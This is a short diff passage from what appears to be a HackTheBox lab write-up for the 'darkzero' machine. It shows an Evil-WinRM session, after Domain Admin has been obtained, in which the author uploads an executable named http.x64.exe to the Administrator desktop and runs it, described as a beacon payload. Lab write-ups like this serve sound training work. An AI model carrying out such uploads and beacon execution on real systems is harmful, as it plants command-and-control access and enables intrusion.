@@ -1040,3 +1040,16 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 
 Domain Admin
 
+```python
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload http.x64.exe
+                                        
+Info: Uploading /home/kali/htb/darkzero/http.x64.exe to C:\Users\Administrator\Desktop\http.x64.exe
+                                        
+Data: 120148 bytes of 120148 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ./http.x64.exe
+```
+
+And just for fun ill upload my beacon payload and execute it
+
